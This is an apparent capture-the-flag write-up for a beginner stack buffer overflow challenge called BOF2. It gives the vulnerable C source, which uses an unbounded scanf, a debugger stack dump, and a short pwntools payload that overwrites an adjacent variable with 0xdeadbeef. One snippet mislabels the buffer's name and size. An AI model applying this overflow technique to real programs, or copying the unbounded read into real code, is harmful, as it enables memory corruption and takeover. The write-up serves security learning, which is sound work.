# BOF2

## Overview
In this challenge, there is a *buffer overflow vulnerability* in the main function. The goal is to overflow into the next variable and change it to `0xdeadbeef`
## Source code summary

```c
int main(){
	int correct = 0;
	char bof[64];
	
	scanf("%s", bof);
	
	if(correct != 0xdeadbeef) {
		puts("you suck!");
		exit(0);
	}
	win();
	return 0;
}

```

We need to overflow in the `correct` and change it to `0xdeadbeef` so that we can call the win function.

## Vulnerability 

```c
char buf[32];
scanf("%s", buf);	
```

`scanf` does no bounds checking.

### Exploit

Overflow into `correct` variable

Stack
I entered `A`  x 64
```
x/24wx $esp
0xffffcff0:	0x0804a028	0xffffd00c	0xf7ffda50	0x080492dc
0xffffd000:	0xffffffff	0xf7fc9694	0xf7ffd608	0x41414141
0xffffd010:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd020:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd030:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd040:	0x41414141	0x41414141	0x41414141	0x00000000
```

The address of the `correct` variable is exactly 64 bytes after the  `bof` variable

### Payload

The payload = 64 bytes to fill the buffer  + `0xdeadbeef`

```python
payload = flat(
        cyclic(64),
        0xdeadbeef
)
```

```sh
python exploit.py 
[*] '/usr/lib/i386-linux-gnu/libc.so.6'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded 10 cached gadgets for './bof2'
[+] Starting local process '/home/hacker/REPO/ctf-pwn/hackucf/bof2/bof2': pid 5164
[*] Switching to interactive mode
fake_flag
```

GOT the flag